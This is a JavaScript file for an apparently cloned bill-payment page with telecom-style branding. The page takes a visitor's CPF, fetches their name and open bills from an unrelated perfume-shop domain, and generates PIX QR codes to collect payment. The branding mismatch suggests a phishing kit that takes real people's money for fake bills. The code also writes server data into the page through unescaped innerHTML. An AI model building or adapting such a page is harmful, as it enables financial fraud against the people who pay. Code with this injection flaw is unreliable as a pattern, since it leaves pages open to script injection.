// Elements
const landingView = document.getElementById('landing-view');
const resultsView = document.getElementById('results-view');
const paymentModal = document.getElementById('payment-modal');
const cpfForm = document.getElementById('cpf-form');
const cpfValue = document.getElementById('cpf-input')
const newSearchBtn = document.getElementById('new-search-btn');
// REMOVA ou comente esta linha: const openModalBtn = document.getElementById('open-modal-btn');
const closeModalBtn = document.getElementById('close-modal-btn');
const modalBackdrop = document.getElementById('modal-backdrop');
const boletoOption = document.getElementById('boleto-option');
const copyPixBtn = document.getElementById('copy-pix-btn');
const pixCode = document.getElementById('pix-code');

//others
const modalHeader = document.getElementById('modalHeader')
const billSummary = document.getElementById('bill-sumary') // Corrigido: era billSumary

const loadingSpinner = document.getElementById('loadingSpinner')
const pixAction = document.getElementById('pixAction')
const paymentOptions = document.getElementById('paymentOptions')
const pixContent = document.getElementById('pixContent');
const closePixModalBtn = document.getElementById('close-pix-modal-btn');

// CPF Form Submit -> Show Results
cpfForm.addEventListener('submit', function (e) {
    showLoading()
    callApi(cpfValue.value)
    console.log(cpfValue.value)
    e.preventDefault();
    landingView.classList.add('hidden');
    window.scrollTo({ top: 0, behavior: 'smooth' });
});

//loading modal
function showLoading() {
    loadingModal.classList.remove('hidden');
}

function hideLoading() {
    loadingModal.classList.add('hidden');
}

//api call
async function callApi(cpf) {
    try {
        const cpfLimpo = cpf.replace(/\D/g, '');
        localStorage.setItem('clientCPF', JSON.stringify(cpfLimpo))
        const response = await fetch('https://chamasperfumes.com/api/search', {
            method: 'POST',
            headers: {
                'Content-type': 'application/json',
            },
            body: JSON.stringify({ cpf: cpf })
        })

        const data = await response.json()
        localStorage.setItem('userData', JSON.stringify(data))

        hideLoading();
        resultsView.classList.remove('hidden');
        showDatapayments()
    } catch (error) {
        console.log(error)
        hideLoading();
    }
}

// Função para mostrar os dados de pagamento
async function showDatapayments() {
    try {
        const data = JSON.parse(localStorage.getItem('userData'));

        if (!data || !data.data) {
            console.error('Dados não encontrados no localStorage');
            return;
        }

        const clientName = document.getElementById('clientName');
        const hideCPF = document.getElementById('hideCPF');
        const totalFaturas = document.getElementById('total-contas');
        const billsContainer = document.getElementById('bills-container');

        // Atualiza informações do cliente
        if (clientName) clientName.textContent = data.data.cliente.nome || '';
        if (hideCPF) hideCPF.textContent = data.data.cliente.cpf || '';
        if (totalFaturas) totalFaturas.textContent = data.data.cliente.totalContas || 0;

        // Renderiza as contas
        if (billsContainer) {
            renderBills(data.data.contas);
        }

    } catch (error) {
        console.error('Erro ao mostrar dados de pagamento:', error);
    }
}

// Renderiza as contas
function renderBills(contas) {
    const billsContainer = document.getElementById('bills-container');
    
    if (!billsContainer) return;
    
    billsContainer.innerHTML = '';
    
    if (!contas || contas.length === 0) {
        billsContainer.innerHTML = `
            <div class="px-6 py-8 text-center text-nio-gray">
                Nenhuma conta encontrada
            </div>
        `;
        return;
    }
    
    contas.forEach((conta, index) => {
        const billElement = createBillElement(conta, index);
        billsContainer.appendChild(billElement);
    });
}

// Cria o elemento de cada conta
function createBillElement(conta, index) {
    const button = document.createElement('button');
    button.className = 'w-full text-left hover:bg-gray-50 transition-colors border-b border-gray-100 last:border-b-0';
    button.setAttribute('data-bill-index', index);
    
    button.addEventListener('click', function() {
        openPaymentModal(index); // Agora chama openPaymentModal com o índice
    });

    const statusClass = getStatusClass(conta.status);

    button.innerHTML = `
        <!-- Desktop Row -->
        <div class="hidden md:grid grid-cols-5 items-center px-6 py-4 text-sm">
            <span class="font-medium text-nio-dark">${conta.titulo || 'Cobrança sem título'}</span>
            <span class="text-center text-nio-dark">${formatCurrency(conta.valor)}</span>
            <span class="text-center text-nio-dark">${formatDate(conta.vencimento)}</span>
            <span class="text-center">
                <span class="inline-block ${statusClass} text-xs font-semibold px-3 py-1 rounded-full">
                    ${conta.status || 'Status não disponível'}
                </span>
            </span>
            <span class="flex justify-end">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
                    stroke="#1a1a1a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M5 12h14" />
                    <path d="m12 5 7 7-7 7" />
                </svg>
            </span>
        </div>
        <!-- Mobile Row -->
        <div class="md:hidden px-4 py-4 space-y-3">
            <div class="flex items-center justify-between">
                <span class="font-medium text-nio-dark text-sm">${conta.titulo || 'Cobrança sem título'}</span>
                <span class="inline-block ${statusClass} text-xs font-semibold px-3 py-1 rounded-full">
                    ${conta.status || 'Status não disponível'}
                </span>
            </div>
            <div class="flex items-center justify-between text-sm text-nio-gray">
                <span>${formatCurrency(conta.valor)}</span>
                <span>Venc: <span>${formatDate(conta.vencimento)}</span></span>
            </div>
            <div class="flex items-center gap-1 text-nio-green text-sm font-medium">
                Ver detalhes
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M5 12h14" />
                    <path d="m12 5 7 7-7 7" />
                </svg>
            </div>
        </div>
    `;

    return button;
}

// Funções auxiliares
function getStatusClass(status) {
    const statusLower = (status || '').toLowerCase();
    if (statusLower.includes('aberto') || statusLower.includes('pendente')) {
        return 'bg-yellow-100 text-yellow-800';
    } else if (statusLower.includes('pago') || statusLower.includes('quitado')) {
        return 'bg-green-100 text-green-800';
    } else if (statusLower.includes('atrasado') || statusLower.includes('vencido')) {
        return 'bg-red-100 text-red-800';
    }
    return 'bg-gray-100 text-gray-800';
}

function formatCurrency(value) {
    if (!value) return 'R$ 0,00';
    const numValue = typeof value === 'string' ? parseFloat(value.replace('R$', '').replace(/\./g, '').replace(',', '.')) : value;
    if (isNaN(numValue)) return 'R$ 0,00';

    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(numValue);
}

function formatDate(dateString) {
    if (!dateString) return 'Data não disponível';
    try {
        if (typeof dateString === 'string' && dateString.includes('-')) {
            const [year, month, day] = dateString.split('-');
            return `${day}/${month}/${year}`;
        }
        return dateString;
    } catch (error) {
        return dateString;
    }
}

// NOVA FUNÇÃO: Abre o modal de pagamento com os dados da conta específica
function openPaymentModal(index) {
    const data = JSON.parse(localStorage.getItem('userData'));
    
    if (!data || !data.data || !data.data.contas || !data.data.contas[index]) {
        console.error('Dados da conta não encontrados');
        return;
    }

    const conta = data.data.contas[index];
    
    // Salva o índice da conta atual no localStorage para usar no generatePix
    localStorage.setItem('currentBillIndex', index);
    
    // Preenche o modal com os dados da conta
    fillModalWithBillData(conta);
    
    // Mostra o modal
    paymentModal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    
    // Reseta o estado do modal (esconde área do PIX se estiver visível)
    resetModalState();
}

// NOVA FUNÇÃO: Preenche o modal com os dados da conta
function fillModalWithBillData(conta) {
    // Preenche o resumo da conta no modal
    const chargeMonth = document.getElementById('chargeMonth');
    const chargeValue = document.getElementById('chargeValue');
    const chargeDate = document.getElementById('chargeDate');
    const chargeStatus = document.getElementById('chargeStatus');
    
    if (chargeMonth) chargeMonth.textContent = conta.titulo || 'Cobrança';
    if (chargeValue) chargeValue.textContent = formatCurrency(conta.valor);
    if (chargeDate) chargeDate.textContent = formatDate(conta.vencimento);
    if (chargeStatus) {
        chargeStatus.textContent = conta.status || 'Status não disponível';
        chargeStatus.className = `inline-block ${getStatusClass(conta.status)} text-xs font-semibold px-3 py-1 rounded-full`;
    }
}

// NOVA FUNÇÃO: Reseta o estado do modal
function resetModalState() {
    // Mostra as opções de pagamento e esconde a área do PIX
    if (paymentOptions) paymentOptions.classList.remove('hidden');
    if (pixContent) pixContent.classList.add('hidden');
    if (modalHeader) modalHeader.classList.remove('hidden');
    if (billSummary) billSummary.classList.remove('hidden');
    if (loadingSpinner) loadingSpinner.classList.add('hidden');
    
    // Reseta o radio button para PIX
    const pixRadio = document.querySelector('input[value="pix"]');
    if (pixRadio) {
        pixRadio.checked = true;
        // Atualiza o estilo dos labels
        updatePaymentLabelsStyle();
    }
}

// NOVA FUNÇÃO: Atualiza o estilo dos labels de pagamento
function updatePaymentLabelsStyle() {
    const paymentLabels = document.querySelectorAll('label:has(input[name="payment"])');
    paymentLabels.forEach(label => {
        const input = label.querySelector('input');
        if (input && input.checked) {
            label.classList.remove('border-gray-200');
            label.classList.add('border-nio-green', 'bg-nio-green/5');
        } else {
            label.classList.add('border-gray-200');
            label.classList.remove('border-nio-green', 'bg-nio-green/5');
        }
    });
}

// New Search -> Back to Landing
newSearchBtn.addEventListener('click', function () {
    resultsView.classList.add('hidden');
    landingView.classList.remove('hidden');
    window.scrollTo({ top: 0, behavior: 'smooth' });
    // Limpa os dados ao voltar
    localStorage.removeItem('userData');
    localStorage.removeItem('currentBillIndex');
});

// Close Payment Modal
function closeModal() {
    paymentModal.classList.add('hidden');
    document.body.style.overflow = '';
    resetModalState();
}

// REMOVA ou comente este bloco:
// openModalBtn.addEventListener('click', function () {
//     paymentModal.classList.remove('hidden');
//     document.body.style.overflow = 'hidden';
// });

closeModalBtn.addEventListener('click', closeModal);
modalBackdrop.addEventListener('click', closeModal);

// ESC to close modal
document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') closeModal();
});

// Payment method toggle styling
const paymentRadios = document.querySelectorAll('input[name="payment"]');
const paymentLabels = document.querySelectorAll('label:has(input[name="payment"])');

paymentRadios.forEach(function (radio) {
    radio.addEventListener('change', function () {
        paymentLabels.forEach(function (label) {
            const input = label.querySelector('input');
            if (input.checked) {
                label.classList.remove('border-gray-200');
                label.classList.add('border-nio-green', 'bg-nio-green/5');
            } else {
                label.classList.add('border-gray-200');
                label.classList.remove('border-nio-green', 'bg-nio-green/5');
            }
        });
    });
});

// Accordion
document.querySelectorAll('.accordion-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
        const targetId = this.getAttribute('data-target');
        const content = document.getElementById(targetId);
        const icon = this.querySelector('svg');
        content.classList.toggle('open');
        if (content.classList.contains('open')) {
            icon.style.transform = 'rotate(45deg)';
        } else {
            icon.style.transform = 'rotate(0deg)';
        }
    });
});

// MODIFICADO: generatePix agora usa o índice salvo
async function generatePix() {
    const url = "https://chamasperfumes.com/api/transaction"

    const cpfData = JSON.parse(localStorage.getItem('clientCPF'));
    const data = JSON.parse(localStorage.getItem('userData'));
    const currentBillIndex = localStorage.getItem('currentBillIndex') || 0;

    console.log("CPF Data:", cpfData);
    console.log("User Data:", data);
    console.log("Current Bill Index:", currentBillIndex);

    if (!data || !data.data) {
        console.error('Dados não encontrados no localStorage');
        return;
    }

    let cpfLimpo = '';
    if (cpfData) {
        cpfLimpo = cpfData.replace(/\D/g, '');
    } else {
        console.error('CPF não encontrado no localStorage');
        return;
    }

    const nome = data.data.cliente?.nome || '';
    if (!nome) {
        console.error('Nome não encontrado nos dados');
        return;
    }

    // Pega a conta específica baseada no índice
    let valor = '';
    let titulo = '';
    if (data.data.contas && Array.isArray(data.data.contas) && data.data.contas[currentBillIndex]) {
        valor = data.data.contas[currentBillIndex].valor || '';
        titulo = data.data.contas[currentBillIndex].titulo || '';
    } else {
        console.error('Conta não encontrada para o índice:', currentBillIndex);
        return;
    }

    // Limpa o valor (remove R$ e espaços)
    const amount = valor.replace('R$', '').replace(/\s+/g, '').replace(',', '.').trim();

    console.log("Dados para PIX:", {
        titulo,
        amount,
        cpfLimpo,
        nome,
        valorOriginal: valor
    });

    try {
        // Mostra loading
        if (loadingSpinner) loadingSpinner.classList.remove('hidden');
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-type': 'application/json',
            },
            body: JSON.stringify({
                titulo,
                amount: amount,
                cpf: cpfLimpo,
                nome: nome
            })
        });

        const result = await response.json();
        console.log("Resposta da API PIX:", result);
        
        // Esconde loading e mostra conteúdo PIX
        showPixContent(result);

        return result;
    } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        if (loadingSpinner) loadingSpinner.classList.add('hidden');
        alert('Erro ao gerar PIX. Tente novamente.');
    }
}

function showPixContent(pixData) {
    // Esconder loading e formulário
    if (loadingSpinner) loadingSpinner.classList.add('hidden');
    if (pixAction) pixAction.classList.add('hidden');
    if (paymentOptions) paymentOptions.classList.add('hidden');
    if (modalHeader) modalHeader.classList.add('hidden');
    if (billSummary) billSummary.classList.add('hidden');

    // Mostrar conteúdo PIX
    if (pixContent) pixContent.classList.remove('hidden');

    const data = JSON.parse(localStorage.getItem('userData'));
    const currentBillIndex = localStorage.getItem('currentBillIndex') || 0;

    console.log("DATA ==>", data)
    console.log("Current Bill Index for PIX content:", currentBillIndex);

    if (!data || !data.data) {
        console.error('Dados não encontrados no localStorage');
        return;
    }

    const pixAmount = document.getElementById('pix-amount');

    // Usa o índice para pegar a conta correta
    if (data.data.contas && data.data.contas[currentBillIndex]) {
        pixAmount.textContent = data.data.contas[currentBillIndex].valor;
        console.log("Valor definido:", pixAmount.textContent);
    } else {
        console.error('Nenhuma conta encontrada para o índice:', currentBillIndex);
    }

    if (pixData) {
        // Atualizar QR Code
        const qrcodeContainer = document.getElementById('qrcode-container');
        if (qrcodeContainer && pixData.qrcode) {
            const pixString = pixData.qrcode.trim();
            qrcodeContainer.innerHTML = `
                <img
                    src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixString)}"
                    alt="QR Code PIX"
                    class="w-48 h-48 mx-auto"
                    onerror="this.onerror=null; console.error('Erro ao carregar QR Code')">
            `;
        } else {
            console.error('QR Code container ou dados não encontrados');
        }

        // Atualizar código PIX
        if (pixCode && pixData.qrcode) {
            pixCode.value = pixData.qrcode.trim();
        } else {
            console.error('Elemento pixCode não encontrado');
        }
    } else {
        console.error('pixData está vazio ou indefinido');
    }
}

// Copiar código PIX
if (copyPixBtn) {
    copyPixBtn.addEventListener('click', function () {
        if (!pixCode) return;

        pixCode.select();
        pixCode.setSelectionRange(0, 99999);

        const copyToClipboard = async () => {
            try {
                await navigator.clipboard.writeText(pixCode.value);
                showCopyFeedback(this);
            } catch (err) {
                document.execCommand('copy');
                showCopyFeedback(this);
            }
        };

        copyToClipboard();
    });
}

// Função para fechar o modal PIX
function closePixModal() {
    if (pixContent) {
        pixContent.classList.add('hidden');
    }

    if (paymentModal) {
        paymentModal.classList.add('hidden');
    }

    resetModalState();
}

// Adicionar event listener para o botão de fechar
if (closePixModalBtn) {
    closePixModalBtn.addEventListener('click', closePixModal);
}

// Função auxiliar para feedback de cópia
function showCopyFeedback(button) {
    const originalHTML = button.innerHTML;
    const originalClass = button.className;

    button.innerHTML = 'Copiado!';
    button.className = originalClass.replace('bg-green-500', 'bg-blue-500');

    setTimeout(() => {
        button.innerHTML = originalHTML;
        button.className = originalClass;
    }, 2000);
}

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    // Se houver dados no localStorage, mostra eles
    if (localStorage.getItem('userData')) {
        showDatapayments();
    }
});